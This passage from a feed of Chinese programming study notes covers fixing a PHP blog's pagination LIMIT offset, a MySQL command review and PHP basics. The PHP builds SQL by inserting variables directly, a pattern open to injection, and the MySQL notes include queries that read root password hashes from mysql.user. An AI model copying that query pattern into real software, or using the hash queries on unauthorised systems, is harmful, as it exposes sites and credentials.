a.id,a.title,a.n,a.author,b.class_name,a.c_time,a.content,a.keyword from article as a,cate as b where a.cateid=b.id and b.id=$id order by a.id desc limit $start,$subPages");                            $result_count=$result_2-&gt;num_rows;                            $p=new Page($result_count,4,$page,$subPages);                            echo $p-&gt;showPages(1);                            ?&gt;                        &lt;/div&gt;                    &lt;/div&gt;                    &lt;!-- 分页 end --&gt;                &lt;/div&gt;                &lt;!-- 内容 end --&gt;                &lt;!-- 侧边栏 --&gt;                &lt;?php                include_once 'right.php';                ?&gt;                &lt;!-- 侧边栏 end --&gt;            &lt;/div&gt;        &lt;/div&gt;        &lt;!-- end container --&gt;    &lt;/section&gt;&lt;/div&gt;&lt;script type="text/javascript" src="js/jquery.min.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="js/jquery.nicescroll.min.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="js/bootstrap.min.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="js/main.min.js"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/07/13/60-zhi-day9/image-20210715150954182.png" alt="image-20210715150954182"></p><p><img src="/2021/07/13/60-zhi-day9/image-20210715150944659.png" alt="image-20210715150944659"></p><h2 id="后台分页bug调试与解决"><a href="#后台分页bug调试与解决" class="headerlink" title="后台分页bug调试与解决"></a>后台分页bug调试与解决</h2><p>我们在后台页面的文章列表那里遇到了几个问题：</p><ul><li>新建文章不会再列表里显示出来</li><li>分页系统换页时出现混乱</li><li>不会讲所有文章列出来</li></ul><p>经过分析发现是sql语句出现了问题 page=1 subpages=4</p><blockquote><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> a<span class="token punctuation">.</span>id<span class="token punctuation">,</span>a<span class="token punctuation">.</span>title<span class="token punctuation">,</span>a<span class="token punctuation">.</span>n<span class="token punctuation">,</span>a<span class="token punctuation">.</span>author<span class="token punctuation">,</span>b<span class="token punctuation">.</span>class_name<span class="token punctuation">,</span>a<span class="token punctuation">.</span>c_time <span class="token keyword">from</span> article <span class="token keyword">as</span> a<span class="token punctuation">,</span>cate <span class="token keyword">as</span> b <span class="token keyword">where</span> a<span class="token punctuation">.</span>cateid<span class="token operator">=</span>b<span class="token punctuation">.</span>id <span class="token keyword">order</span> <span class="token keyword">by</span> a<span class="token punctuation">.</span>id <span class="token keyword">desc</span> <span class="token keyword">limit</span> $page<span class="token punctuation">,</span>$subPages<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>这条语句刚开始从1开始取4个，按照我们的想法接下来应该是从5开始取4个，这样，但是现在这条语句成了从1开始取4个 然后从2开始取4个这样字，效果就成了前面少一个  后面多一个。</p><p>错误效果如下：</p><p><img src="/2021/07/13/60-zhi-day9/image-20210715143952680.png" alt="image-20210715143952680"></p><p><img src="/2021/07/13/60-zhi-day9/image-20210715144004920.png" alt="image-20210715144004920"></p><p>所以我我们需要更改页面开始遍历的位置，</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$start</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token variable">$subPages</span><span class="token punctuation">;</span><span class="token comment">//0*8 1*8 2*8 每页8个</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> a<span class="token punctuation">.</span>id<span class="token punctuation">,</span>a<span class="token punctuation">.</span>title<span class="token punctuation">,</span>a<span class="token punctuation">.</span>n<span class="token punctuation">,</span>a<span class="token punctuation">.</span>author<span class="token punctuation">,</span>b<span class="token punctuation">.</span>class_name<span class="token punctuation">,</span>a<span class="token punctuation">.</span>c_time <span class="token keyword">from</span> article <span class="token keyword">as</span> a<span class="token punctuation">,</span>cate <span class="token keyword">as</span> b <span class="token keyword">where</span> a<span class="token punctuation">.</span>cateid<span class="token operator">=</span>b<span class="token punctuation">.</span>id <span class="token keyword">order</span> <span class="token keyword">by</span> a<span class="token punctuation">.</span>id <span class="token keyword">desc</span> <span class="token keyword">limit</span> $<span class="token keyword">start</span><span class="token punctuation">,</span>$subPages<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第一页</p><p><img src="/2021/07/13/60-zhi-day9/image-20210715144659005.png" alt="image-20210715144659005"></p><p>第二页</p><p><img src="/2021/07/13/60-zhi-day9/image-20210715144714851.png" alt="image-20210715144714851"></p><p>然后我们增加文章发现也被显示出来了</p><p>箭头为增加出来的文章</p><p><img src="/2021/07/13/60-zhi-day9/image-20210715144749670.png" alt="image-20210715144749670"></p><p>主页的分页系统也做同样修改</p>]]></content>
      
      
      <categories>
          
          <category> 博客编写 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql</title>
      <link href="/2021/07/12/60-zhi-day8/"/>
      <url>/2021/07/12/60-zhi-day8/</url>
      
        <content type="html"><![CDATA[<h1 id="mysql数据库温习"><a href="#mysql数据库温习" class="headerlink" title="mysql数据库温习"></a>mysql数据库温习</h1><span id="more"></span><h2 id="mysql数据库"><a href="#mysql数据库" class="headerlink" title="mysql数据库"></a>mysql数据库</h2><h3 id="数据库基本操作"><a href="#数据库基本操作" class="headerlink" title="数据库基本操作"></a>数据库基本操作</h3><h4 id="mysql登陆与退出"><a href="#mysql登陆与退出" class="headerlink" title="mysql登陆与退出"></a>mysql登陆与退出</h4><p>登录：mysql -u用户名 -p密码 -h地址</p><p>三种退出方法：</p><ol><li>exit;</li><li>quit;</li><li>\q;</li></ol><h4 id="mysql的一些解释"><a href="#mysql的一些解释" class="headerlink" title="mysql的一些解释"></a>mysql的一些解释</h4><p>数据库相当于文件夹，表相当于文件</p><h4 id="mysql三种注释符"><a href="#mysql三种注释符" class="headerlink" title="mysql三种注释符"></a>mysql三种注释符</h4><ol><li><h1 id=""><a href="#" class="headerlink" title=""></a></h1></li><li>– (减减空格)</li><li>/*  */</li></ol><h4 id="数据库的增删改查"><a href="#数据库的增删改查" class="headerlink" title="数据库的增删改查"></a>数据库的增删改查</h4><p>增：create database db1;</p><p>删：drop database db1;</p><p>改：alter database db1 charset utf8</p><p>查：show databases;#查看所有的数据库</p><p>show create database db1;查看指定的数据库    </p><p>设置默认的utf8,在配置文件中：写上character_set_server = utf8</p><p>use db2  </p><p>select database() #查看你当前在哪个文件夹</p><p>重命名数据库 RENAME database olddbname TO newdbname</p><p>show status; – 显示一些系统特定资源的信息，例如，正在运行的线程数量。 </p><p>desc tabl_name; 显示表结构，字段类型，主键，是否为空等属性，但不显示外键。</p><p>show databases 查看这个mysql里面有多少个库</p><p>use 选择数据库</p><p>show tables 查看当前库里面所有的表</p><p>mysql&gt; select password from user where user=’root’;</p><p>Mysql 5.7 select authentication_string,user from mysql.user;</p><p>查看当前数据库 里面的表user 用户为root的密码</p><p>alter database 数据库名 character set utf8;</p><h3 id="表的操作"><a href="#表的操作" class="headerlink" title="表的操作"></a>表的操作</h3><h4 id="查看表结构"><a href="#查看表结构" class="headerlink" title="查看表结构"></a>查看表结构</h4><p>desc table    </p><p>DESCRIBE 表名;</p><h4 id="查看表内容"><a href="#查看表内容" class="headerlink" title="查看表内容"></a>查看表内容</h4><p>select *from table_name;</p><h4 id="建立表"><a href="#建立表" class="headerlink" title="建立表"></a>建立表</h4><p>CREATE TABLE 表名 (</p><p>​        属性名 数据类型 [完整约束条件],</p><p>​        属性名 数据类型 [完整约束条件],</p><p>​        …</p><p>​        …</p><p>​        属性名 数据类型 [完整约束条件]</p><p>​    );</p><blockquote><p>一个例子:</p><p>create table users(id int(7) UNSIGNED auto_increment,username varchar(30) not null,password varchar(32) not null,email varchar(40),primary key (id))engine=myisam default charset=utf8;</p></blockquote><p>ENGINE=InnoDB DEFAULT CHARSET=utf8;</p><p>ENGINE 设置表的引擎 和默认的字符类型</p><p>常见的数据库引擎 </p><p>InnoDB、 myisam </p><p>数据类型：</p><h4 id="约束条件"><a href="#约束条件" class="headerlink" title="约束条件"></a>约束条件</h4><p>PRIMARY KEY 标识该属性为该表的主键，可以唯一的标识对应的元组</p><p>FOREIGN KEY 标识该属性为该表的外键，是与之联系某表的主键</p><p>NOT NULL    标识该属性不能为空</p><p>UNIQUE 标识该属性的值是唯一的</p><p>AUTO_INCREMENT    标识该属性的值是自动增加，这是MySQL的SQL语句的特色</p><p>DEFAULT     为该属性设置默认值</p><h4 id="修改表"><a href="#修改表" class="headerlink" title="修改表"></a>修改表</h4><ul><li><p>改表名</p><p>​      格式：ALTER TABLE 旧表名 RENAME 新表名;</p></li><li><p>修改字段的数据类型</p><p>​       ALTER TABLE 表名 MODIFY 属性名 数据类型;</p></li><li><p>修改字段名：</p><p>​       ALTER TABLE 表名 CHANGE 旧属性名 新属性名 新数据类型;</p></li><li><p>增加字段名</p><p>​         ALTER TABLE 表名 ADD 属性名1 数据类型 [完整性约束条件] [FIRST | AFTER 属性名2];</p></li><li><p>删除字段</p><p>​          ALTER TABLE 表名 DROP 属性名;</p></li><li><p>更改表的存储引擎</p><p>​          ALTER TABLE 表名 ENGINE = 存储引擎名;</p></li></ul><h3 id="数据的增删改查"><a href="#数据的增删改查" class="headerlink" title="数据的增删改查"></a>数据的增删改查</h3><h4 id="增"><a href="#增" class="headerlink" title="增"></a>增</h4><p>为表中所有字段添加数据：</p><p>语法： insert into 表名 (属性1，属性2，…) values (‘值1’,’值2’,…)；</p><p>同时添加多条数据：</p><p>语法： insert into 表名 (属性1，属性2，…) values (‘值1’,’值2’,…)，(‘值1’,’值2’,…)；</p><h4 id="删"><a href="#删" class="headerlink" title="删"></a>删</h4><p>删除表中某条数据：</p><p>语法：delete from 表名 where 条件;</p><p>删除全部数据:</p><p>语法：delete from 表名 </p><h4 id="改"><a href="#改" class="headerlink" title="改"></a>改</h4><p>update 表名 set 属性1=值1，属性2=值2 where 条件;</p><h4 id="查"><a href="#查" class="headerlink" title="查"></a>查</h4><p>select 字段1，字段2 from 表名 where条件;</p><ul><li><p>查询所有字段:</p><p>select *from users;#*代表所有字段</p></li><li><p>查询指定字段;</p><p>select username,password from users;</p></li><li><p>in查询：</p><p>select *from users where id in (1,2,8,7);</p></li><li><p>带 between and 关键字的查询：</p><p>select username from users where id not between 1 and 10;</p></li><li><p>带distinct关键字的查询：(关键词 DISTINCT 用于返回唯一不同的值)</p><p>select distinct username from users;</p></li><li><p>带ike关键字的查询：常与%一起使用</p><p>select * from users where username like “%m%” ;</p><p><img src="/2021/07/12/60-zhi-day8/Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20210712182159272.png" alt="image-20210712182159272"></p></li><li><p>下划线_匹配一个字符</p><p>select *from users where username like”xiaosha_”;</p></li><li><p>and 查询 满足多个条件</p><p>select * from users where id=1 and username=’xaioshaK’;</p></li><li><p>or查询 满足任一条件</p><p>select * from users where id=1 or username=’xiaoshaK’;</p></li><li><p>OR 和 AND 一起使用的情况</p><p>OR 和 AND 一起使用的时候，AND 的优先级高于 OR，因此二者一起使用时，会先运算 AND 两边的表达式，再运算 OR 两边的表达式。</p><p>select * from users where id &gt;5 and password=’123456c’ or username=’xiaoshaK’;</p></li><li><p>聚合查询</p><p>COUNT() 返回某列的行数</p><p>SUM() 返回某列值的和</p><p>AVG() 返回某列的平均值</p><p>MAX() 返回某列的最大值</p><p>MIN() 返回某列的最小值</p></li><li><p>分组查询</p><p>SELECT * FROM users GROUP BY username;</p><p>+—-+———-+———-+</p><p>| id | username | password |</p><p>+—-+———-+———-+</p><p>|  2 | alex1   | 456789  |</p><p>|  1 | moon   | 456789  |</p><p>|  3 | moon1   | 123456  |</p><p>+—-+———-+———-+</p><p>3 rows in set (0.01 sec)</p></li><li><p>使用LIMIT查询</p><p>select * from users limit 2,10;#从第三条开始，取十个</p></li><li><p>为表和字段取别名</p><p>select * from users as u where u.id=1;</p><p>select username as myname from users;</p></li></ul><p>mysql子查询：</p><ul><li><p>where型子查询</p><p>（把内层查询结果当作外层查询的比较条件）    </p><p>​         select * from users where id in (select id from users where id&gt;10);                    </p></li><li><p>from型子查询 </p><p>​    (把内层的查询结果供外层再次查询)                    </p><p>​        select * from (select username,age from users) as agev_a where age&gt;20    </p><p>​        select * from (select * from users where id&gt;=10) as age_10;    </p><p>​            (select * from users where id&gt;=10)查询出来的是一个集合 别名为age_10</p><p>​            select * from age_10</p><p>​            </p></li><li><p>exists型子查询</p><p>​    （把外层查询结果拿到内层，看内层的查询是否成立）</p><p>1</p><p>0</p><p>select * from users where EXISTS (select * from users where id&gt;1)</p></li></ul><p>联合查询：</p><p>默认地，UNION 操作符选取不同的值。如果允许重复的值，请使用 UNION ALL。</p><p>当 ALL 随 UNION 一起使用时（即 UNION ALL），不消除重复行</p><p>两次查询的列数必须一致</p><p>select * from users union select *,1 from news;#都是查询所有列</p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php基础</title>
      <link href="/2021/07/08/60-zhi-day4/"/>
      <url>/2021/07/08/60-zhi-day4/</url>
      
        <content type="html"><![CDATA[<h1 id="php基础"><a href="#php基础" class="headerlink" title="php基础"></a>php基础</h1><span id="more"></span><h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>PHP（全称：PHP：Hypertext Preprocessor，即”PHP：超文本预处理器”）是一种通用开源脚本语言。</p><p>一个php文件可以包括以下内容：</p><ul><li>php文件可以包含文本、HTML、JavaScript代码和PHP代码</li><li>php代码在服务器上执行，结果以纯HTML形式返回给浏览器</li><li>php文件默认文件扩展名是.php</li></ul><p>php使用：</p><ul><li>PHP 可以生成动态页面内容</li><li>PHP 可以创建、打开、读取、写入、关闭服务器上的文件</li><li>PHP 可以收集表单数据</li><li>PHP 可以发送和接收 cookies</li><li>PHP 可以添加、删除、修改您的数据库中的数据</li><li>PHP 可以限制用户访问您的网站上的一些页面</li><li>PHP 可以加密数据</li></ul><h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><h3 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h3><p>php脚本以  &lt;?php  开始，以  ?大于号  结束</p><p>注释同Java</p><h3 id="变量命名"><a href="#变量命名" class="headerlink" title="变量命名"></a>变量命名</h3><p>变量以$符开始，后门跟变量名称。</p><p>变量名必须以字母或下划线开始</p><p>变量名只能包含字母、数字和下划线。</p><p>变量名不能包含空格</p><p>php变量声明以$开始</p><blockquote><p>static的关键字的使用:</p><p>当一个函数完成时，它的所有变量通常都会被删除。</p><p>然而，有时候您希望某个局部变量不要被删除。</p><p>要做到这一点，请在您第一次声明变量时使用 static 关键字：</p></blockquote><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>php有5种数据类型：String(字符串)、Integer(整型)、Float(浮点型)、Boolean(布尔型)、Array(数组)  Object(对象)、NULL(空值)</p><h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><p>常量是一个简单的标识符，在脚本中不能改变。(在整个脚本中都能使用)</p><p>一个常量由英文字母、下划线和数字组成，数字不能作为首字母出现，不需要加$修饰。</p><p>设置常量：使用define()函数  </p><blockquote><p>bool define ( string $name , mixed $value [, bool $case_insensitive = false ] )</p><p>　　该函数有三个参数:</p><p>name：必选参数，常量名称，即标志符。</p><p>value：必选参数，常量的值。</p><p>case_insensitive ：可选参数，如果设置为 TRUE，该常量则大小写不敏感。默认是大小写敏感的。</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">// 常量</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"CL"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"这是一个全局常量"</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token constant">CL</span><span class="token punctuation">;</span> <span class="token comment">// 默认false，变量名区分大小写</span><span class="token keyword">echo</span> cl<span class="token punctuation">;</span> <span class="token comment">// true不区分大小写</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="预定义常量"><a href="#预定义常量" class="headerlink" title="预定义常量"></a>预定义常量</h3><p>PHP预定义了许多常量，这些常量无需使用define()函数定义，可直接在程序中使用。</p><ol><li><strong>FILE</strong>(FILE前后分别是两个下画线)：当前正在处理的脚本文件名，若使用在一个被引用的文件中（include或require），那么　　它的值就是被引用的文件，而不是引用它的那个文件。</li><li><strong>LINE</strong>(LINE前后分别是两个下画线)：正在处理的脚本文件的当前行数。</li><li>PHP_VERSION：当前PHP预处理器的版本，如5.4.16。</li><li>PHP_OS: PHP所在的操作系统的类型。如Linux。</li><li>TRUE：表示逻辑真。FALSE：表示逻辑假。NULL：表示没有值或值不确定。</li><li>DIRECTORY_SEPARATOR: 表示目录分隔符，UNIX或Linux操作系统环境时的值为“ / ”, Window操作系统环境时的值为 “ \ ”。</li></ol><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token constant">__FILE__</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br/&gt;"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token constant">__LINE__</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br/&gt;"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token constant">PHP_VERSION</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br/&gt;"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token constant">PHP_OS</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br/&gt;"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token constant">DIRECTORY_SEPARATOR</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/07/08/60-zhi-day4/image-20210709103113099.png" alt="image-20210709103113099"></p><h2 id="整型"><a href="#整型" class="headerlink" title="整型"></a>整型</h2><p>整数类型：保存整数数值(范围限制)，4个字节存储数据</p><p>php中提供四种整型定义方式：</p><ol><li>$a = 120 //十进制</li><li>$a = 0b110 //二进制</li><li>$a = 0120     //八进制</li><li>$a = 0x120    //十六进制</li></ol><p>使用echo输出时。默认输出为十进制</p><p>下面5个函数可以进行转换：</p><ul><li>decbin()  十进制转二进制</li><li>decoct() 十进制转八进制</li><li>dechex() 十进制转十六进制</li><li>bindec() 二进制转十进制</li><li>bin2hex()二进制转十六进制 </li></ul><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><p>用于存储并处理变量</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$name</span><span class="token operator">=</span><span class="token string single-quoted-string">'晓莎K'</span><span class="token punctuation">;</span><span class="token comment">//双引号里面有变量，会输出变量的值</span><span class="token variable">$str</span><span class="token operator">=</span><span class="token string double-quoted-string">"这是 <span class="token interpolation"><span class="token variable">$name</span></span> 的blog。"</span><span class="token punctuation">;</span><span class="token comment">//单引号里面有变量，会把变量作为字符串处理</span><span class="token variable">$str1</span><span class="token operator">=</span><span class="token string single-quoted-string">'这是 $name 的blog'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$str1</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/07/08/60-zhi-day4/image-20210709103926302.png" alt="image-20210709103926302"></p><p>$str后双引号与单引号有区别，如上</p><p>一些字符串的操作函数：</p><ul><li>addcslashes — 以 C 语言风格使用反斜线转义字符串中的字符</li><li>addslashes — 使用反斜线引用字符串</li><li>bin2hex — 函数把包含数据的二进制字符串转换为十六进制值</li><li>chop — rtrim 的别名</li><li>chr — 返回指定的字符</li><li>chunk_split — 将字符串分割成小块</li><li>convert_cyr_string — 将字符由一种 Cyrillic 字符转换成另一种</li><li>convert_uudecode — 解码一个 uuencode 编码的字符串</li><li>convert_uuencode — 使用 uuencode 编码一个字符串</li><li>count_chars — 返回字符串所用字符的信息</li><li>crc32 — 计算一个字符串的 crc32 多项式</li><li>crypt — 单向字符串散列</li><li>echo — 输出一个或多个字符串</li><li>explode — 使用一个字符串分割另一个字符串</li><li>fprintf — 将格式化后的字符串写入到流</li><li>get_html_translation_table — 返回使用 htmlspecialchars 和 htmlentities 后的转换表</li><li>hebrev — 将逻辑顺序希伯来文（logical-Hebrew）转换为视觉顺序希伯来文（visual-Hebrew）</li><li>hebrevc — 将逻辑顺序希伯来文（logical-Hebrew）转换为视觉顺序希伯来文（visual-Hebrew），并且转换换行符</li><li>hex2bin — 转换十六进制字符串为二进制字符串</li><li>html_entity_decode — Convert HTML entities to their corresponding characters</li><li>htmlentities — 将字符转换为 HTML 转义字符</li><li>htmlspecialchars_decode — 将特殊的 HTML 实体转换回普通字符</li><li>htmlspecialchars — 将特殊字符转换为 HTML 实体</li><li>implode — 将一个一维数组的值转化为字符串</li><li>join — 别名 implode</li><li>lcfirst — 使一个字符串的第一个字符小写</li><li>levenshtein — 计算两个字符串之间的编辑距离</li><li>localeconv — Get numeric formatting information</li><li>ltrim — 删除字符串开头的空白字符（或其他字符）</li><li>md5_file — 计算指定文件的 MD5 散列值</li><li>md5 — 计算字符串的 MD5 散列值</li><li>metaphone — Calculate the metaphone key of a string</li><li>money_format — 将数字格式化成货币字符串</li><li>nl_langinfo — Query language and locale information</li><li>nl2br — 在字符串所有新行之前插入 HTML 换行标记</li><li>number_format — 以千位分隔符方式格式化一个数字</li><li>ord — 转换字符串第一个字节为 0-255 之间的值</li><li>parse_str — 将字符串解析成多个变量</li><li>print — 输出字符串</li><li>printf — 输出格式化字符串</li><li>quoted_printable_decode — 将 quoted-printable 字符串转换为 8-bit 字符串</li><li>quoted_printable_encode — 将 8-bit 字符串转换成 quoted-printable 字符串</li><li>quotemeta — 转义元字符集</li><li>rtrim — 删除字符串末端的空白字符（或者其他字符）</li><li>setlocale — 设置地区信息</li><li>sha1_file — 计算文件的 sha1 散列值</li><li>sha1 — 计算字符串的 sha1 散列值</li><li>similar_text — 计算两个字符串的相似度</li><li>soundex — Calculate the soundex key of a string</li><li>sprintf — Return a formatted string</li><li>sscanf — 根据指定格式解析输入的字符</li><li>str_contains — Determine if a string contains a given substring</li><li>str_ends_with — Checks if a string ends with a given substring</li><li>str_getcsv — 解析 CSV 字符串为一个数组</li><li>str_ireplace — str_replace 的忽略大小写版本</li><li>str_pad — 使用另一个字符串填充字符串为指定长度</li><li>str_repeat — 重复一个字符串</li><li>str_replace — 子字符串替换</li><li>str_rot13 — 对字符串执行 ROT13 转换</li><li>str_shuffle — 随机打乱一个字符串</li><li>str_split — 将字符串转换为数组</li><li>str_starts_with — Checks if a string starts with a given substring</li><li>str_word_count — 返回字符串中单词的使用情况</li><li>strcasecmp — 二进制安全比较字符串（不区分大小写）</li><li>strchr — 别名 strstr</li><li>strcmp — 二进制安全字符串比较</li><li>strcoll — 基于区域设置的字符串比较</li><li>strcspn — 获取不匹配遮罩的起始子字符串的长度</li><li>strip_tags — 从字符串中去除 HTML 和 PHP 标记</li><li>stripcslashes — 反引用一个使用 addcslashes 转义的字符串</li><li>stripos — 查找字符串首次出现的位置（不区分大小写）</li><li>stripslashes — 反引用一个引用字符串</li><li>stristr — strstr 函数的忽略大小写版本</li><li>strlen — 获取字符串长度</li><li>strnatcasecmp — 使用“自然顺序”算法比较字符串（不区分大小写）</li><li>strnatcmp — 使用自然排序算法比较字符串</li><li>strncasecmp — 二进制安全比较字符串开头的若干个字符（不区分大小写）</li><li>strncmp — 二进制安全比较字符串开头的若干个字符</li><li>strpbrk — 在字符串中查找一组字符的任何一个字符</li><li>strpos — 查找字符串首次出现的位置</li><li>strrchr — 查找指定字符在字符串中的最后一次出现</li><li>strrev — 反转字符串</li><li>strripos — 计算指定字符串在目标字符串中最后一次出现的位置（不区分大小写）</li><li>strrpos — 计算指定字符串在目标字符串中最后一次出现的位置</li><li>strspn — 计算字符串中全部字符都存在于指定字符集合中的第一段子串的长度。</li><li>strstr — 查找字符串的首次出现</li><li>strtok — 标记分割字符串</li><li>strtolower — 将字符串转化为小写</li><li>strtoupper — 将字符串转化为大写</li><li>strtr — 转换指定字符</li><li>substr_compare — 二进制安全比较字符串（从偏移位置比较指定长度）</li><li>substr_count — 计算字串出现的次数</li><li>substr_replace — 替换字符串的子串</li><li>substr — 返回字符串的子串</li><li>trim — 去除字符串首尾处的空白字符（或者其他字符）</li><li>ucfirst — 将字符串的首字母转换为大写</li><li>ucwords — 将字符串中每个单词的首字母转换为大写</li><li>vfprintf — 将格式化字符串写入流</li><li>vprintf — 输出格式化字符串</li><li>vsprintf — 返回格式化字符串</li><li>wordwrap — 打断字符串为指定数量的字串</li></ul><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><p>算术运算符：</p><p><img src="/2021/07/08/60-zhi-day4/image-20210709172635142.png" alt="image-20210709172635142"></p><p>a.b a并置b，即把俩个字符串连接起来</p><p>赋值运算符：</p><p><img src="/2021/07/08/60-zhi-day4/image-20210709172649470.png" alt="image-20210709172649470"></p><p>a.=b a等于a并置b， 即连接俩个字符串</p><p>递增/递减运算符：</p><p><img src="/2021/07/08/60-zhi-day4/image-20210709172713520.png" alt="image-20210709172713520"></p><p>比较运算符：</p><p><img src="/2021/07/08/60-zhi-day4/image-20210709172724240.png" alt="image-20210709172724240"></p><p>===绝对等于，值跟类型都得相同才返回true。</p><p>==等于，值相同就返回true</p><p>逻辑运算符：</p><p><img src="/2021/07/08/60-zhi-day4/image-20210709172734131.png" alt="image-20210709172734131"></p><p>三元运算符：</p><p><img src="/2021/07/08/60-zhi-day4/image-20210709172758484.png" alt="image-20210709172758484"></p><p>判断expr1，成立执行expr2，不成立执行expr3</p><h2 id="控制语句"><a href="#控制语句" class="headerlink" title="控制语句"></a>控制语句</h2><p>条件控制语句、循环控制语句</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//foreach的例子</span><span class="token variable">$a1</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$a1</span> <span class="token keyword">as</span> <span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$v</span><span class="token operator">.</span><span class="token string single-quoted-string">'---'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/07/08/60-zhi-day4/image-20210709180425025.png" alt="image-20210709180425025"></p><h2 id="php数组"><a href="#php数组" class="headerlink" title="php数组"></a>php数组</h2><p>数组是一个能在单个变量中存储多个值的特殊变量。</p><p>php中，array()函数用于创建数组，print_r(数组)函数用于输出数组</p><p>php中有三种数组类型：</p><ul><li><em><strong>*数值数组*</strong></em> - 带有数字 ID 键的数组</li><li><em><strong>*关联数组*</strong></em> - 带有指定的键的数组，每个键关联一个值</li><li><em><strong>*多维数组*</strong></em> - 包含一个或多个数组的数组</li></ul><h3 id="php中的多个数组排序内置函数"><a href="#php中的多个数组排序内置函数" class="headerlink" title="php中的多个数组排序内置函数"></a>php中的多个数组排序内置函数</h3><ul><li>sort() - 对数组进行升序排列</li><li>rsort() - 对数组进行降序排列</li><li>asort() - 根据关联数组的值，对数组进行升序排列</li><li>ksort() - 根据关联数组的键，对数组进行升序排列</li><li>arsort() - 根据关联数组的值，对数组进行降序排列</li><li>krsort() - 根据关联数组的键，对数组进行降序排列</li></ul><h3 id="数组的操作"><a href="#数组的操作" class="headerlink" title="数组的操作"></a>数组的操作</h3><h4 id="数组合并-array-merge"><a href="#数组合并-array-merge" class="headerlink" title="数组合并(array_merge)"></a>数组合并(array_merge)</h4><p>$array3 = array_merge($array1,$array2);</p><h4 id="增加数组元素"><a href="#增加数组元素" class="headerlink" 